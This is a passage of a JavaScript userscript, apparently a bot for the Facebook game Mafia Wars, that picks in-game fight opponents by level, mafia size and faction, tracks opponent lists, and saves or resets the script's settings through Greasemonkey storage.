                  profElt.parentNode.innerHTML = '<span class="good">'+resultManiac+' </span>' + profElt.parentNode.innerHTML;
              }
              var testMogul = /level\s([a-z,A-Z,0-9]+)\sMogul/.test(s.untag());
              var resultMogul = RegExp.$1;
              if (testMogul == true) {
                  profElt.parentNode.innerHTML = '<span class="good">'+resultMogul+' </span>' + profElt.parentNode.innerHTML;
              }
              var testFearless = /level\s([a-z,A-Z,0-9]+)\sFearless/.test(s.untag());
              var resultFearless = RegExp.$1;
              if (testFearless == true) {
                  profElt.parentNode.innerHTML = '<span class="good">'+resultFearless+' </span>' + profElt.parentNode.innerHTML;
              }
          }
        }
      };
      loadUrl (getProfileUrl(opponent.id), urlLoaded);
    }*/

    getHitlist.opponents.push(opponent);
  }
  DEBUG(getHitlist.opponents.length + ' hitlist target(s) found.');

  if (!getHitlist.opponents.length) return [];

  //for (var i = 0; i < getHitlist.opponents.length; i++) {
  //  var opponent = getHitlist.opponents[i];
  //  GM_log('Saw id=' + opponent.id +
  //         ', title=' + opponent.title +
  //         ', name=' + opponent.name +
  //         ', bounty=' + opponent.bounty +
  //         ', time=' + opponent.time);
  // }

  return getHitlist.opponents;
}

// Returns a non-empty array of the displayed opponents, or undefined.
function getDisplayedOpponents(element, forceRefresh) {
  // If the list was already seen, don't read it again.
  if (!forceRefresh && getDisplayedOpponents.opponents) {
    if (!getDisplayedOpponents.opponents.length) return [];
    return getDisplayedOpponents.opponents;
  }
  getDisplayedOpponents.opponents = [];
  var i, linkElt, row, rowData, opponent, fight = true;

  // First, look for a traditional fight table (one with real links).
  var links = $x('.//table[@class="main_table fight_table"]//a[contains(@onclick, "opponent_id")]', element);

  // Get each potential opponent in the displayed list.
  for (i = 0, iLength=links.length; i < iLength; i++) {
    linkElt = links[i];
    opponent = new Player();
    row     = linkElt.parentNode.parentNode;
    rowData = row.getElementsByTagName('td');
    nameAndLevel = row;

    // Get the opponent's details.
    opponent.profile = nameAndLevel.getElementsByTagName('a')[0];
    if (!opponent.profile) continue;
    var onClickText  = opponent.profile.getAttribute('onclick');
    var oppParamName = 'user=';
    if (!new RegExp(oppParamName).test(onClickText)) oppParamName = 'opponent_id=';
    opponent.id      = decodeID(opponent.profile.getAttribute('onclick').split(oppParamName)[1].split('\'')[0].split('&')[0]);
    if (!opponent.id) continue;

    opponent.attack  = linkElt;
    opponent.mafia   = rowData[1] ? parseInt(rowData[1].innerHTML) : 0;
    opponent.level   = parseInt(nameAndLevel.innerHTML.split('</a>')[1].split('Level ')[1]);
    opponent.name    = opponent.profile.innerHTML;
    opponent.faction = '';
    if (rowData[0].style.color == 'rgb(102, 102, 102)') {
      opponent.iced = true;
      // Hide iced opponents
      if (!running && isGMChecked('showPulse')) row.style.display = 'none';
    } else
      opponent.iced = false;
    var factionElt   = xpathFirst('.//img', rowData[2]);
    if (factionElt && factionElt.alt) opponent.faction = factionElt.alt;
    if (opponent.profile.previousSibling &&
        opponent.profile.previousSibling.nodeValue.match(/\w+(?: \w+)*/)) {
      opponent.title = RegExp.lastMatch;
    }
    if (!opponent.level) {
      addToLog('warning Icon', 'BUG DETECTED: Unable to read opponent level.');
      addToLog('warning Icon', 'Row contents: '+ row.innerHTML);
    } else if (!opponent.mafia) {
      addToLog('warning Icon', 'BUG DETECTED: Unable to read opponent mafia.');
      addToLog('warning Icon', 'Row contents: '+ row.innerHTML);
    } else {
      getDisplayedOpponents.opponents.push(opponent);
    }
  }

  if (!getDisplayedOpponents.opponents.length) return [];

  DEBUG(getDisplayedOpponents.opponents.length + ' opponents listed.');
  //for (var i = 0; i < getDisplayedOpponents.opponents.length; ++i) {
  //  var opponent = getDisplayedOpponents.opponents[i];
  //  GM_log('Saw id=' + opponent.id +
  //         ', mafia=' + opponent.mafia +
  //         ', faction=' + opponent.faction +
  //         ', level=' + opponent.level +
  //         ', title=' + opponent.title +
  //         ', name=' + opponent.name);
  // }

  return getDisplayedOpponents.opponents;
}

// Searches the fight table in the subtree of the given element for new
// random targets. Returns a new opponent, or undefined.
function findFightOpponent(element) {
  // This will force the fight logic to refresh target list everytime.
  fightListNew.set([]);

  // Don't bother searching if we still have plenty.
  var newOpponents = fightListNew.get();
  var len = newOpponents.length;
  if (len >= 50) {
    return newOpponents[Math.floor(Math.random() * len)];
  }

  // Check the fight table.
  var opponents = getDisplayedOpponents(element, true);
  if (!opponents) {
    // No opponents displayed on this page.
    return newOpponents[Math.floor(Math.random() * len)];
  }

  // Calculate faction points
  var factionElts = xpath('.//div[@class="faction_container"]', innerPageElt);
  var factionCnt = factionElts.snapshotLength;
  if (factionElts.snapshotLength > 0) {
    allyFaction = '';
    var maxPts = 0, minPts = 1500;
    for (var i = 0, iLength = factionElts.snapshotLength; i < iLength; ++i) {
      var factionElt = factionElts.snapshotItem(i);
      var factionName = xpathFirst('.//div[@class="faction_name"]',factionElt).innerHTML.trim();
      var factionPts = parseInt(xpathFirst('.//div[@class="zy_progress_bar_faction_text"]',factionElt).innerHTML.split('/')[0].trim());

      // Keep track of max and min faction pts
      if (!isNaN(factionPts) && factionPts > maxPts) {
        maxPts = factionPts;
      }
      if (!isNaN(factionPts) && factionPts < minPts) {
        minPts = factionPts;
        allyFaction = factionName;
      }
    }

    // Do not enable faction filtering
    if (maxPts - minPts < cities[city][CITY_ALLIANCE])
      allyFaction = '';
    DEBUG('Factions found: ' + factionCnt + '<br>' +
          'Max faction pts: ' + maxPts + '<br>' +
          'Min faction pts: ' + minPts + '<br>' +
          'Ally faction: ' + allyFaction);
  }

  // Get the user's criteria for opponents.
  var opponentLevelMax = parseInt(GM_getValue('fightLevelMax', 100));
  var opponentMafiaMax = parseInt(GM_getValue('fightMafiaMax', 501));
  var opponentMafiaMin = parseInt(GM_getValue('fightMafiaMin', 1));
  var fightNames = isGMChecked('fightNames');
  var avoidNames = isGMChecked('fightAvoidNames');
  var onlyNames = isGMChecked('fightOnlyNames');

  // Make any relative adjustments (if enabled).
  if (GM_getValue('fightLevelMaxRelative', false)) {
    opponentLevelMax = opponentLevelMax + level;
  }
  if (GM_getValue('fightMafiaMaxRelative', false)) {
    opponentMafiaMax = opponentMafiaMax + mafia;
  }
  if (GM_getValue('fightMafiaMinRelative', false)) {
    opponentMafiaMin = mafia - opponentMafiaMin;
  }
  if (opponentMafiaMin > 501) {
    opponentMafiaMin = 501;
  }

  // Show which players to blacklist.
  var avoidLosers = (isGMChecked('fightStealth') ||
                     newOpponents.length);
  DEBUG(fightListNew.debug());
  DEBUG(fightListAvoid.debug());
  if (avoidLosers) {
    DEBUG(fightListInactive.debug());
    DEBUG(fightListActive.debug());
  }

  // Figure out which opponents are acceptable.
  DEBUG('Applying criteria to displayed opponents: ' +
        'level <= ' + opponentLevelMax + ', mafia between ' +
        opponentMafiaMin + ' and ' + opponentMafiaMax + '.');
  var levelMaxCount = 0;
  var mafiaMaxCount = 0;
  var mafiaMinCount = 0;
  var namesCount = 0;
  var factionCount = 0;
  var blacklistCount = 0;
  var icedCount = 0;
  var countOpp = opponents.length;
  for(var i = 0; i < countOpp; ++i) {
    var opponent = opponents[i];

    // Balance faction points
    if (opponent.faction.length > 0 && allyFaction.length > 0 &&
        opponent.faction == allyFaction) {
      factionCount++;
      continue;
    }

    if (GM_getValue('fightMobMode')) {
      // Mob fight mode.  Fight players of higher level but smaller mafia.
      if (opponent.level > (opponentLevelMax * 501 / opponent.mafia)) {
        levelMaxCount++;
        continue;
      }
    } else {
      if (opponent.level > opponentLevelMax) {
        levelMaxCount++;
        continue;
      }
    }
    if (opponent.mafia > opponentMafiaMax) {
      mafiaMaxCount++;
      continue;
    }
    if (opponent.mafia < opponentMafiaMin) {
      mafiaMinCount++;
      continue;
    }

    if (fightNames && avoidNames && isFamily(decodeHTMLEntities(opponent.name),STAMINA_HOW_FIGHT_RANDOM)) {
      namesCount++;
      continue;
    }

    if (fightNames && onlyNames && !isFamily(decodeHTMLEntities(opponent.name),STAMINA_HOW_FIGHT_RANDOM)) {
      namesCount++;
      continue;
    }

    if (!opponent.id) continue;

    // Check iced oponents
    if (isGMChecked('iceCheck') && opponent.iced) {
      icedCount++;
      continue;
    }

    // Check against previous opponents.
    var idx = fightListAvoid.indexOf(opponent);
    if (idx != -1) {
      // We can't fight them, but update their info.
      fightListAvoid.get()[idx].update(opponent);
      blacklistCount++;
      continue;
    }

    if (avoidLosers) {
      idx = fightListInactive.indexOf(opponent);
      if (idx != -1) {
        fightListInactive.get()[idx].update(opponent);
        blacklistCount++;
        continue;
      }
      idx = fightListActive.indexOf(opponent);
      if (idx != -1) {
        fightListActive.get()[idx].update(opponent);
        blacklistCount++;
        continue;
      }
    }
    if (!fightListNew.add(opponent)) {
      blacklistCount++;
      continue;
    }
    // This opponent is new and acceptable.
    DEBUG('Found new fight opponent: name=' + opponent.name +
          ', id=' + opponent.id + ', level=' + opponent.level +
          ', mafia=' + opponent.mafia + ', faction=' + opponent.faction);
  }

  var disqualifiedCount = levelMaxCount + mafiaMaxCount + mafiaMinCount + namesCount + factionCount + icedCount + blacklistCount;
  if (countOpp <= disqualifiedCount) {
    addToLog('info Icon', 'Out of the ' + countOpp + ' opponent(s) listed on the fight page '+disqualifiedCount+' disqualified.<br>' +
              levelMaxCount + ' on max level, ' +  mafiaMaxCount + ' on max mafia, ' +  mafiaMinCount + ' on min mafia,<br>' +
              namesCount + ' on name pattern, ' +  factionCount + ' on faction, ' +  icedCount + ' already iced, <br>' +
              blacklistCount + ' by blacklisting (stronger opponents).<br>');
  }

  newOpponents = fightListNew.get();
  if (!newOpponents.length) return -1;

  if (newOpponents.length > len) {
    fightListNew.set();
  }

  return newOpponents[Math.floor(Math.random() * newOpponents.length)];
}

function setFightOpponentActive(player) {
  if (!player) return;

  // Add the opponent to the active list.
  DEBUG('Marking fight opponent active, id=' + player.id);
  fightListActive.add(player, 10);
  fightListActive.set();

  // Remove the opponent from the other fight lists.
  if (fightListInactive.remove(player))
    fightListInactive.set();
  if (fightListNew.remove(player))
    fightListNew.set();
  if (fightListAvoid.remove(player))
    fightListAvoid.set();
}

function setFightOpponentInactive(player) {
  if (!player) return;

  // Add the opponent to the inactive list.
  DEBUG('Marking fight opponent inactive, id=' + player.id);
  fightListInactive.add(player, 10);
  fightListInactive.set();

  // Remove the opponent from the other fight lists.
  if (fightListActive.remove(player))
    fightListActive.set();
  if (fightListNew.remove(player))
    fightListNew.set();
  if (fightListAvoid.remove(player))
    fightListAvoid.set();
}

function setFightOpponentAvoid(player) {
  if (!player) return;

  // Add the opponent to the avoid list.
  DEBUG('Marking fight opponent avoid, id=' + player.id);
  fightListAvoid.add(player, 100);
  fightListAvoid.set();

  // Remove the opponent from all other fight lists.
  if (fightListActive.remove(player))
    fightListActive.set();
  if (fightListInactive.remove(player))
    fightListInactive.set();
  if (fightListNew.remove(player))
    fightListNew.set();

  // Only remove the first occurence from the user-supplied list.
  removeSavedListItem('fightList', player.id);
}

function setHitmanOpponentAvoid(opponent) {
  if (!opponent) return;

  // Add the opponent to the avoid list.
  DEBUG('Marking hitlist opponent ' + opponent + ' avoid.');
  addSavedListItem('hitmanListAvoid', opponent, 100);
}

function toggleSettings() {
  if (settingsOpen === false) {
    // Stop any running timers so the settings box won't disappear.
    Autoplay.clearTimeout();
    Reload.clearTimeout();

    settingsOpen = true;
    createSettingsBox();
    showSettingsBox();
  } else {
    settingsOpen = false;
    destroyByID('GenDialogPopDialog');

    // Restart the timers.
    Autoplay.delay = 150;
    Autoplay.start();
    autoReload();
  }
}

function toggleStats() {
  if (settingsOpen === true) {
    toggleSettings();
  }
  if (statsOpen === false) {
    statsOpen = true;
    if (!document.getElementById('statsWindow')) {
      createStatWindow();
    }
    showStatsWindow();
    // Stop any running timers so the settings box won't disappear.
    Autoplay.clearTimeout();
    Reload.clearTimeout();
  } else {
    statsOpen = false;
    hideStatsWindow();
    Autoplay.delay = 150;
    Autoplay.start();
    autoReload();
  }
}

function showSettingsBox() {
  var settingsBoxContainer = document.getElementById('GenDialogPopDialog');
  if (settingsBoxContainer) {
    settingsBoxContainer.style.display = 'block';
  }
}

function showMafiaLogBox() {
  if (!document.getElementById('mafiaLogBox')) {
    createLogBox();
  } else {
    var mafiaLogBoxDiv = document.getElementById('mafiaLogBox');
    mafiaLogBoxDiv.style.display = 'block';
  }
  if (!debug && GM_getValue('logOpen') != 'open' &&
      !isGMChecked('autoLog')) {
    alert('Logging is not enabled. To see new activity here, please open your settings and check "Enable logging" in the General tab.');
  }
  GM_setValue('logOpen', 'open');
}

function showStatsWindow() {
  var statsWindowContainer = document.getElementById('sWindowGenDialogPopDialog');
  if (statsWindowContainer) {
    statsWindowContainer.style.display = 'block';
  }
}

function hideMafiaLogBox() {
  var mafiaLogBoxDiv = document.getElementById('mafiaLogBox');
  mafiaLogBoxDiv.style.display = 'none';
  GM_setValue('logOpen', 'closed');
}

function hideStatsWindow() {
  var statsWindowContainer = document.getElementById('sWindowGenDialogPopDialog');
  if (statsWindowContainer) {
    statsWindowContainer.style.display = 'none';
  }
}

function handleVersionChange() {
  addToLog('updateGood Icon', 'Now running version ' + SCRIPT.version + ' <a href="http://www.playerscripts.com/" target="_blank">playerscripts.com</a>');

  // Check for invalid settings and upgrade them.

  if (!isNaN(GM_getValue('build')) && parseInt(GM_getValue('build')) < 388) {
    GM_setValue('minCashNew York', GM_getValue('buyMinAmount'));
  }

  if (GM_getValue('buildCarId') >= cityCars.length) {
    GM_setValue('buildCarId', cityCars.length - 1)
  }

  if (GM_getValue('buildWeaponId') >= cityWeapons.length) {
    GM_setValue('buildWeaponId', cityWeapons.length - 1)
  }

  if (!isNaN(GM_getValue('build')) && parseInt(GM_getValue('build')) < 335) {
    GM_setValue('missions', JSON.stringify('[]'));
  }

  // Clear invalid jobs
  if (!isNaN(GM_getValue('build')) && parseInt(GM_getValue('build')) < 279) {
    var selectS = GM_getValue('selectMission', 0);
    if (selectS > 268)
      GM_setValue('selectMission', 268);

    var selectM = getSavedList('selectMissionMultiple');
    if (selectM && selectM.length) {
      selectM = selectM.filter(function(v, i, a) { return (a[i] > 268) ? 0:1; });
      setSavedList('selectMissionMultiple', selectM);
    }
  }

  // Uncheck use fight stealth
  if (!isNaN(GM_getValue('build')) && parseInt(GM_getValue('build')) < 262) {
    GM_setValue('fightStealth', '');
  }

  // Update saved script version
  GM_setValue('version', SCRIPT.version);
  //addToLog('updateGood Icon', 'Variable upgrades validated: ' + SCRIPT.version + ' <a href="http://www.playerscripts.com/" target="_blank">playerscripts.com</a>');
}

function saveDefaultSettings() {
  // Assume all settings have been cleared and set defaults.
  // For groups of radio buttons, one must be checked and all others cleared.
  // For checkboxes, no need to default if the option should be off.
  var i;

  // General tab.
  GM_setValue('autoClick', 'checked');
  GM_setValue('r1', '30');
  GM_setValue('r2', '110');
  GM_setValue('autoHeal', 'checked');
  GM_setValue('healthLevel', '50');
  GM_setValue('forceHealOpt1', 'checked');
  GM_setValue('healLocation', NY);
  GM_setValue('bankConfig', '50000');
  GM_setValue('bankConfigCuba', '50000');
  GM_setValue('bankConfigMoscow', '50000');
  GM_setValue('bankConfigBangkok', '50000');
  GM_setValue('bankConfigVegas', '50000');
  GM_setValue('autoPauseBefore', 'checked');
  GM_setValue('autoPauseAfter', 0);
  GM_setValue('autoPauseExp', '50');
  GM_setValue('autoLog', 'checked');
  GM_setValue('autoLogLength', '300');
  GM_setValue('logPlayerUpdates', 'checked');
  GM_setValue('logPlayerUpdatesMax', '25');
  GM_setValue('d1', '3');
  GM_setValue('d2', '5');
  GM_setValue('stamina_min_heal', '0');
  GM_setValue('idleLocation', NY);
  GM_setValue('autoHelp', 'checked');
  GM_setValue('autoBurnerHelp', 'checked');
  GM_setValue('autoPartsHelp', 'checked');
  GM_setValue('autoLottoBonusItem',3);
  GM_setValue('autoWarTargetList', '');
  GM_setValue('warMode', 0);
  GM_setValue('autoGiftAccept', 0);
  GM_setValue('autoGiftAcceptChoice', 0);
  GM_setValue('autoGiftAcceptReward', 0);
  GM_setValue('autoSafehouse', 0);

  // Misc Tab
  GM_setValue('autoResetTimers', 0);
  //GM_setValue('autoMainframe', 0);
  //GM_setValue('autoMainframeCode', 0);
  GM_setValue('autoDailyChecklist', 0);
  GM_setValue('autoStat', 0);
  GM_setValue('autoStatDisable', 0);

  for (i = 0, iLength=autoStatModes.length; i < iLength; ++i)
    GM_setValue(autoStatModes[i], 0);

  for (i = 0, iLength=autoStatPrios.length; i < iLength; ++i)
    GM_setValue(autoStatPrios[i], 0);

  for (i = 0, iLength=autoStatBases.length; i < iLength; ++i)
    GM_setValue(autoStatBases[i], 0);

  for (i = 0, iLength=autoStatRatios.length; i < iLength; ++i)
    GM_setValue(autoStatRatios[i], 0);

  for (i = 0, iLength=autoStatFallbacks.length; i < iLength; ++i)
    GM_setValue(autoStatFallbacks[i], 0);

  GM_setValue('filterLog', 0);
  GM_setValue('filterOpt', 0);
  GM_setValue('filterPass', defaultPassPatterns.join('\n'));
  GM_setValue('filterFail', defaultFailPatterns.join('\n'));
  GM_setValue('filterLootOpt', 0);

  // Energy tab.
  GM_setValue('estimateJobRatio', '1');
  GM_setValue('autoEnergyPackForce', 0);
  GM_setValue('autoEnergyPackForcePts', 0);

  // Stamina tab.
  GM_setValue('staminaSpendHow', STAMINA_HOW_FIGHT_RANDOM);
  GM_setValue('fightLocation', NY);
  GM_setValue('fightLevelMax', 100);
  GM_setValue('fightMafiaMax', 501);
  GM_setValue('fightMafiaMin', 1);

  GM_setValue('fightNames', 'checked');
  GM_setValue('fightAvoidNames', 'checked');
  GM_setValue('fightOnlyNames', 0);

  GM_setValue('hitmanLocation', NY);
  GM_setValue('hitmanNames', 'checked');
  GM_setValue('hitmanAvoidNames', 'checked');
  GM_setValue('fightOnlyNames', 0);

  GM_setValue('fightRemoveStronger', 'checked');

  GM_setValue('fightClanName', defaultClans.join('\n'));
  GM_setValue('hitmanClanName', defaultClans.join('\n'));

  GM_setValue(randomFightLocations,'10000');
  GM_setValue(randomRobLocations,'10000');
  GM_setValue(randomHitmanLocations,'10000');
  GM_setValue(randomSpendModes,'1000');

  GM_setValue('robLocation', NY);
  GM_setValue('selectStaminaKeep', 0);
  GM_setValue('selectStaminaUse', 0);
  GM_setValue('selectStaminaKeepMode', 0);
  GM_setValue('selectStaminaUseMode', 0);
  GM_setValue('selectEnergyKeep', 0);
  GM_setValue('selectEnergyUse', 0);
  GM_setValue('selectEnergyKeepMode', 0);
  GM_setValue('selectEnergyUseMode', 0);

  // Health tab.
  GM_setValue('stopPA', 'checked');
  GM_setValue('stopPAHealth', 29);
  GM_setValue('stopBursts', 'unchecked');
  GM_setValue('stopBurstsHealth', 0);

  // Property tab.
  GM_setValue('minCashNew York', '0');
  GM_setValue('minCashCuba', '0');
  GM_setValue('minCashMoscow', '0');
  GM_setValue('minCashBangkok', '0');

  // Other settings.
  GM_setValue('logOpen', 'open');

  addToLog('process Icon', 'Options reset to defaults.');
}

function saveSettings() {
  //NOTE : TODO Validation for all numeric fields

  var i;
  //Start Save General Tab Settings
  //General Tab Checkboxes
  saveCheckBoxElementArray([
    'autoClick','autoPause','idleInCity','autoLottoOpt','autoLottoBonus','burnFirst','featJob'
  ]);
  //General Tab Settings
  GM_setValue('r1', document.getElementById('r1').value);
  GM_setValue('r2', document.getElementById('r2').value);
  GM_setValue('d1', document.getElementById('d1').value);
  GM_setValue('d2', document.getElementById('d2').value);

  if (saveCheckBoxElement('autoPauseBefore')) {
    GM_setValue('autoPauselvlExp', ptsToNextLevel);
    GM_setValue('autoPauseActivated', false);
  }
  if (saveCheckBoxElement('autoPauseAfter')) {
    GM_setValue('autoPauselvlExp', ptsToNextLevel);
  }
  GM_setValue('autoPauseExp', document.getElementById('autoPauseExp').value);

  GM_setValue('idleLocation', document.getElementById('idleLocation').selectedIndex);

  GM_setValue('autoLottoBonusItem', document.getElementById('autoLottoList').selectedIndex);

  GM_setValue('burnOption', document.getElementById('burnOption').value);
  GM_setValue('featJobIndex', document.getElementById('featJobIndex').selectedIndex);

  for (i = 0, iLength=cities.length; i < iLength; ++i) {
    if (cities[i][CITY_SIDES].length > 0) {
      var id = cities[i][CITY_SIDE_NAME];
      for (var j = 0, jLength = cities[i][CITY_SIDES].length; j < jLength; ++j) {
        GM_setValue(id, document.getElementById(id).selectedIndex);
      }
    }
  }

  //End Save General Tab Settings

  //Start Save Display Tab Settings
  //Display Tab Checkboxes
  saveCheckBoxElementArray([
    'autoLog','logPlayerUpdates','filterLog','leftAlign','mastheadOnTop','fbwindowtitle','showPulse','showLevel',
    'hideGifts','hideGiftIcon','hideActionBox','hideOffer','hideFriendLadder', 'hideMessageIcon','hidePromoIcon','hideLiveUpdatesIcon','hideAttentionBox','HideSlotMachine','HideCollections'
  ]);

  //Display Tab Settings and Validation
  GM_setValue('autoLogLength', document.getElementById('autoLogLength').value);

  var filterOpt = document.getElementById('filterOpt').value;
  GM_setValue(filterOpt == 0 ? 'filterPass' : 'filterFail', document.getElementById('filterPatterns').value);
  GM_setValue('filterOpt', filterOpt);
  var filterLootOpt = document.getElementById('filterLootOpt').value;
  GM_setValue('filterLootOpt', filterLootOpt);

  var logPlayerUpdates = (document.getElementById('logPlayerUpdates').checked === true);
  var logPlayerUpdatesMax = parseInt(document.getElementById('logPlayerUpdatesMax').value);
  if (logPlayerUpdates && (isNaN(logPlayerUpdatesMax) || logPlayerUpdatesMax < 0 || logPlayerUpdatesMax > 70)) {
    alert('The maximum number of player updates must be between 0 and 70.\nDefaulting it to 25.');
    document.getElementById('logPlayerUpdatesMax').value = 25;
    return;
  }

  // Examine share wishlist time
  var shareWishlistTime = document.getElementById('autoShareWishlistTime').value;
  if (isNaN(shareWishlistTime) || parseFloat(shareWishlistTime) < 1) {
    alert('The share wishlist timer has to be at least 1 hour. For decimal numbers please use ".", e.g. 1.5.\nDefaulting it to 1 hour.');
    document.getElementById('autoShareWishlistTime').value = 1;
    return;
  }
  //End Save Display Tab Settings

  //Start Save Mafia Tab Settings

  //Mafia Tab Checkboxes
  saveCheckBoxElementArray([
    'autoAskJobHelp','acceptMafiaInvitations','autoLevelPublish','autoAchievementPublish','autoIcePublish','autoSecretStash','autoShareWishlist',
    'autoHelp','autoWarHelp','autoBurnerHelp','autoPartsHelp','autoWarBetray','autoGiftSkipOpt','autoGiftWaiting','autoGiftAccept','autoSafehouse',
    'sendEnergyPack','askEnergyPack','rewardEnergyPack',
    'autoWar','autoWarPublish','autoWarRallyPublish','autoWarResponsePublish','autoWarRewardPublish'
  ]);
  //MafiaTab Settings and Validation
  GM_setValue('autoAskJobHelpMinExp', document.getElementById('autoAskJobHelpMinExp').value);

  GM_setValue('selectMoscowTier', (document.getElementById('selectMoscowTier').value)?document.getElementById('selectMoscowTier').value:0);
  GM_setValue('selectMoscowTiercheck', (document.getElementById('selectMoscowTier').value)?'checked':0);
  GM_setValue('selectBangkokTier', (document.getElementById('selectBangkokTier').value)?document.getElementById('selectBangkokTier').value:0);
  GM_setValue('selectBangkokTiercheck', (document.getElementById('selectBangkokTier').value)?'checked':0);

  GM_setValue('autoIcePublishFrequency', document.getElementById('autoIcePublishFrequency').value);
  GM_setValue('autoSecretStashFrequency', document.getElementById('autoSecretStashFrequency').value);

  GM_setValue('autoShareWishlistTime', document.getElementById('autoShareWishlistTime').value);

  GM_setValue('autoGiftAcceptChoice', document.getElementById('autoGiftAcceptChoice').selectedIndex);
  GM_setValue('autoGiftAcceptReward', document.getElementById('autoGiftAcceptReward').selectedIndex);

  GM_setValue('warMode', document.getElementById('warMode').selectedIndex);

  GM_setValue('autoWarTargetList', document.getElementById('autoWarTargetList').value);
  //End Save Mafia Tab Settings

  //Start Save Autostat Tab Settings
  //Autostat Tab Checkboxes
  saveCheckBoxElementArray([
    'autoStat','autoStatDisable','autoStatAttackFallback','autoStatDefenseFallback','autoStatHealthFallback','autoStatEnergyFallback','autoStatStaminaFallback',
    'autoResetTimers','autoDailyChecklist',
  ]);
  //Autostat Settings and Validation
  GM_setValue('restAutoStat', 0);
  for (i = 0, iLength=autoStatBases.length; i < iLength; ++i)
    GM_setValue(autoStatBases[i], document.getElementById(autoStatBases[i]).value);
  for (i = 0, iLength=autoStatRatios.length; i < iLength; ++i)
    GM_setValue(autoStatRatios[i], document.getElementById(autoStatRatios[i]).value);
  for (i = 0, iLength=autoStatModes.length; i < iLength; ++i)
    GM_setValue(autoStatModes[i], document.getElementById(autoStatModes[i]).value);
  for (i = 0, iLength=autoStatPrios.length; i < iLength; ++i)
    GM_setValue(autoStatPrios[i], document.getElementById(autoStatPrios[i]).value);

  GM_setValue('autoEnforcedTitle', (document.getElementById('autoEnforcedTitle').value)?document.getElementById('autoEnforcedTitle').value:"");

  // Validate autoEnforcedTitleTime
  var autoEnforcedTitleTime = document.getElementById('autoEnforcedTitleTime').value;
  if (isNaN(autoEnforcedTitleTime) || parseFloat(autoEnforcedTitleTime) < 1) {
    alert('The Enforce Title timer has to be at least 1 hour. For decimal numbers please use ".", e.g. 1.5.\nDefaulting it to 1 hour.');
    document.getElementById('autoEnforcedTitleTime').value = 2;
    return;
  } else {
    GM_setValue('autoEnforcedTitleTime',autoEnforcedTitleTime);
  }

  // Validate the auto-stat setting.
  var autoStatOn = (document.getElementById('autoStat').checked === true);
  for (i = 0, iLength=autoStatBases.length; i < iLength; ++i) {
    if (autoStatOn && isNaN(document.getElementById(autoStatBases[i]).value)) {
      alert('Please enter valid numbers for auto-stat ' + autoStatDescrips[i+1] + ' (Misc tab). : ' + document.getElementById(autoStatBases[i]).value);
      return;
    }
  }

  for (i = 0, iLength=autoStatRatios.length; i < iLength; ++i) {
    if (autoStatOn && isNaN(document.getElementById(autoStatRatios[i]).value)) {
      alert('Please enter valid numbers for auto-stat ' + autoStatDescrips[i+1] + ' (Misc tab).');
      return;
    }
  }


  //End Save Autostat Tab Settings

  //Start Save Energy Tab Settings
  //Energy Tab Checkboxes
  saveCheckBoxElementArray([
    'autoMission','masterAllJobs','multipleJobs','burstJob','endLevelOptimize','checkMiniPack','autoEnergyPack','autoEnergyPackForce',
    'hasHelicopter','hasGoldenThrone','isManiac','allowEnergyToLevelUp','skipfight'
  ]);
  //Energy Settings and Validation
  //Validate burstJobCount
  var burstJobCount = document.getElementById('burstJobCount').value;
  if (isNaN(burstJobCount)) {
    alert('Please enter numeric values for burstJobCount.');
    return;
  } else if (parseInt(burstJobCount) > 50) {
    alert('Please limit job bursts to 50.');
    return;
  }
  GM_setValue('burstJobCount', burstJobCount);

  if (document.getElementById('masterAllJobs').checked === true) {
    GM_setValue('repeatJob', 0);
  } else {
    GM_setValue('repeatJob', 'checked');
  }

  var multiple_jobs_list = [];
  var mastery_jobs_list = [];
  selectedTierValue = document.getElementById('selectTier').value.split('.');
  masteryCity = parseInt(selectedTierValue[0]);
  masteryTier = parseInt(selectedTierValue[1]);
  for (i = 0, iLength = missions.length; i < iLength; i++) {
    if (document.getElementById(missions[i][MISSION_NAME]).checked) {
      multiple_jobs_list.push(i);
    }
    if (masteryCity == missions[i][MISSION_CITY] &&
        masteryTier == missions[i][MISSION_TAB]) {
      mastery_jobs_list.push(i);
    }
  }
  setSavedList('selectMissionMultiple', multiple_jobs_list);
  setSavedList('masteryJobsList', mastery_jobs_list);
  GM_setValue('selectMission', document.getElementById('selectMissionS').selectedIndex);
  GM_setValue('selectTier', document.getElementById('selectTier').value);

  // Validate the estimated job ratio setting.
  var autoEnergyPackOn = (document.getElementById('autoEnergyPack').checked === true );
  var estimateJobRatio = parseFloat(document.getElementById('estimateJobRatio').value);

  if (autoEnergyPackOn) {
    if (isNaN(estimateJobRatio)) {
      alert('Please enter a number between 0 and 3 for your estimated job xp to energy ratio');
      return;
    }
  }
  GM_setValue('estimateJobRatio', document.getElementById('estimateJobRatio').value);
  GM_setValue('autoEnergyPackForcePts', document.getElementById('autoEnergyPackForcePts').value);

  // Validate and save energy limits settings.
  var selectEnergyUse = document.getElementById('selectEnergyUse').value;
  var selectEnergyKeep = document.getElementById('selectEnergyKeep').value;
  if (isNaN(selectEnergyUse) || isNaN(selectEnergyKeep)) {
    alert('Please enter numeric values for Energy reserve and Energy threshold.');
    return;
  }

  GM_setValue ('selectEnergyUse', selectEnergyUse);
  GM_setValue ('selectEnergyKeep', selectEnergyKeep);
  GM_setValue ('selectEnergyUseMode', document.getElementById('selectEnergyUseMode').selectedIndex);
  GM_setValue ('selectEnergyKeepMode', document.getElementById('selectEnergyKeepMode').selectedIndex);
  //End Save Energy Tab Settings

  //Start Save Stamina Tab Settings
  //Stamina Tab Checkboxes

  //Stamina Settings and Validation
  // Validate stamina tab.
  var staminaTabSettings = validateStaminaTab();
  if (!staminaTabSettings) return;

  for (var key in staminaTabSettings) {
      GM_setValue(key, staminaTabSettings[key]);
  }

  //End Save Stamina Tab Settings

  //Start Save Health Tab Settings
  //Health Tab Checkboxes
  saveCheckBoxElementArray([
    'autoHeal','quickHeal','attackCritical','hideInHospital','forceHealOpt3','forceHealOpt4','forceHealOpt5','forceHealOpt7','hideAttacks','BlockHealRobbing','stopPA','stopBursts'
  ]);
  //Heal Settings and Validation
  var autoHealOn  = (document.getElementById('autoHeal').checked === true);
  var healthLevel = parseInt(document.getElementById('healthLevel').value);
  if (autoHealOn && (!healthLevel || healthLevel < 1)) {
    alert('Health level for automatic healing must be 1 or more.');
    return;
  }
  GM_setValue('healthLevel', healthLevel);
  GM_setValue('healLocation', document.getElementById('healLocation').value);

  GM_setValue('stamina_min_heal', document.getElementById('stamina_min_heal').value);

  var hideAttacks = (document.getElementById('hideAttacks').checked === true);
  var rideHitlistXP = parseInt(document.getElementById('rideHitlistXP').value);
  if (hideAttacks) {
    if (isNaN(rideHitlistXP) || rideHitlistXP < 0 || rideHitlistXP > 50) {
